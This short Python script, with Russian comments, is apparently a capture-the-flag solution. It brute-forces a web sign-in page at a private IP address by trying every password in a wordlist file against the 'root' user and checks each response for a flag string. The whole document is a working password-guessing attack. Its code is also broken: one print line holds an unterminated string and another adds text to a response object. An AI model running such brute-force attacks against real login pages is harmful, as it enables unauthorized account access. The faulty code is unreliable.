import requests # для запросов http
import re

def brute_force_signin():
    with open('john.txt') as password_collections:
        for string in password_collections.readlines():
            string = string.strip() # обрежет лишние пробелы и табуляции
            parameters = dict(page='signin',
                    username='root',
                    password=string,
                    Login='Login') # кнопка
            result = requests.get('http://192.168.56.101/?page=signin', params=parameters)
            search_flag = re.search(r"(flag.*?)<", result.text, re.I)
            if (search_flag):
                print("Password found" + result)
            else:
                print(f'variaty number
brute_force_signin()
